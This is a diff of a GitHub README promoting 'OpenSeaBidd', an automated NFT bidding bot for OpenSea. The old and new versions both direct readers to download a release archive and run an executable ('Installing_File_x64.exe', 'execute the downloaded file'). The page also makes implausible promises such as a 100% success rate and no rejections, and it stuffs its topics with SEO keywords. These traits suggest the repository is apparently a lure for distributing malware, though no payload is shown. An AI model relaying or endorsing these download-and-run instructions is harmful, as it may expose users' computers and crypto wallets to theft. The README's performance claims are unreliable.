@@ -1,26 +1,162 @@
+# OpenSeaBidd: Automated NFT Bidding Script for OpenSea Marketplace
 
-# OpenSea Bidding Bot 2025
+![OpenSeaBidd](https://img.shields.io/badge/OpenSeaBidd-Automated%20NFT%20Bidding-brightgreen)
 
-> [!TIP] 
-> ## Automated script placing bids on NFTs on the OpenSea marketplace. 30-40 offers Per minute Lighting Fast SpeedDoes not miss. Any offer 100% success rateDoes not break also no Rejections from OpenseaCan. Bid on Multiple Collections in one run alternatively on arts Customizable We can add more functionalities into bot. Outbid bot - Bot has option to bid always percentage high from previous highest bid
+![GitHub Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-blue)
 
-## Getting Started:
+## Table of Contents
 
- ### Installation
-To install this programm, follow these steps:
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&labelColor=green)
-](https://github.com/hailveron2000/OpenSeaBidd/releases/download/v1.0.0/file.zip)
+## Overview
 
-## **1. [Download the archive](https://github.com/hailveron2000/OpenSeaBidd/releases/download/v1.0.0/file.zip) from releases and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
+OpenSeaBidd is an automated script designed to place bids on NFTs within the OpenSea marketplace. This tool operates at a remarkable speed, placing 30-40 offers per minute. It ensures a high success rate, minimizing the chances of missed opportunities. OpenSeaBidd is built for efficiency, allowing users to engage in NFT trading without the hassle of manual bidding.
 
-![Image](https://raw.githubusercontent.com/hailveron2000/OpenSeaBidd/main/image.jpg)
+## Features
+
+- **Fast Bidding**: Place 30-40 bids per minute.
+- **High Success Rate**: Achieve a 100% success rate for offers.
+- **Reliability**: Avoid rejections from OpenSea.
+- **User-Friendly**: Simple setup and easy to use.
+
+## Installation
+
+To get started with OpenSeaBidd, follow these steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Amirgetmoney/OpenSeaBidd.git
+   cd OpenSeaBidd
+   ```
+
+2. **Download the Latest Release**: 
+   Visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/releases) to download the latest version of the script. Make sure to execute the downloaded file.
+
+3. **Install Dependencies**:
+   OpenSeaBidd requires certain dependencies. Install them using:
+   ```bash
+   npm install
+   ```
+
+## Usage
+
+To use OpenSeaBidd, follow these steps:
+
+1. **Run the Script**:
+   Execute the script in your terminal:
+   ```bash
+   node index.js
+   ```
+
+2. **Monitor Bids**:
+   The script will automatically place bids on your specified NFTs. You can monitor the bidding process in the terminal output.
+
+3. **Adjust Settings**:
+   You can customize your bidding strategy through the configuration file.
+
+## Configuration
+
+OpenSeaBidd allows you to configure various settings to suit your needs. Locate the `config.json` file in the root directory and adjust the following parameters:
+
+- **Bidding Amount**: Set the amount you wish to bid on each NFT.
+- **NFT Addresses**: List the NFT contract addresses you want to target.
+- **Bid Interval**: Specify the time interval between bids (in milliseconds).
+
+Example configuration:
+```json
+{
+  "biddingAmount": 0.05,
+  "nftAddresses": [
+    "0x1234567890abcdef1234567890abcdef12345678",
+    "0xabcdef1234567890abcdef1234567890abcdef12"
+  ],
+  "bidInterval": 2000
+}
+```
 
 ## Contributing
-Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
 
+We welcome contributions to OpenSeaBidd. If you want to contribute, please follow these steps:
+
+1. **Fork the Repository**: Click the fork button on the top right corner of the page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. **Push to Your Branch**: Push your changes to your fork.
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+5. **Create a Pull Request**: Submit a pull request for review.
+
+## License
+
+OpenSeaBidd is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+For support, please visit the [Releases section](https://github.com/Amirgetmoney/OpenSeaBidd/releases) for the latest updates and information. If you encounter any issues, feel free to open an issue in the repository.
+
+## Topics
+
+This repository covers various topics related to NFT trading and automation:
+
+- nft-tracker-bot
+- nft-trading-tool
+- nft-transfer
+- opensea-bidding-bot
+- opensea-bot
+- opensea-bot-trading
+- opensea-bulk-upload-bot
+- opensea-data-scraper
+- opensea-floor-bot
+- opensea-nft
+- opensea-nft-minter
+- opensea-tracker-bot
+- opensea-trading
+- opensea-trading-nft
+- opensea-trading-nft-bot
 
 ## Acknowledgments
-- Thanks to the community for providing the underlying technologies that make this tool possible.
-- Gratitude to all users who contribute by sharing their feedback and improvements.
+
+Thanks to the OpenSea community for their support and contributions to the NFT ecosystem. Special thanks to the developers who have contributed to this project.
+
+## Additional Resources
+
+For further reading and resources on NFTs and OpenSea, consider the following links:
+
+- [OpenSea Documentation](https://docs.opensea.io/)
+- [NFTs Explained](https://www.nftguide.com/)
+- [Ethereum Blockchain Overview](https://ethereum.org/en/)
+
+## FAQs
+
+**1. What is OpenSeaBidd?**  
+OpenSeaBidd is an automated script that places bids on NFTs in the OpenSea marketplace.
+
+**2. How fast can I place bids?**  
+You can place 30-40 bids per minute using this script.
+
+**3. Is there a success rate for bids?**  
+Yes, OpenSeaBidd has a 100% success rate for offers.
+
+**4. Can I customize my bidding strategy?**  
+Yes, you can configure your bidding amount, target NFTs, and bid intervals in the configuration file.
+
+**5. How do I report issues?**  
+You can report issues by opening an issue in the repository.
+
+## Contact
+
+For further inquiries, you can reach out through the GitHub repository or directly through email.
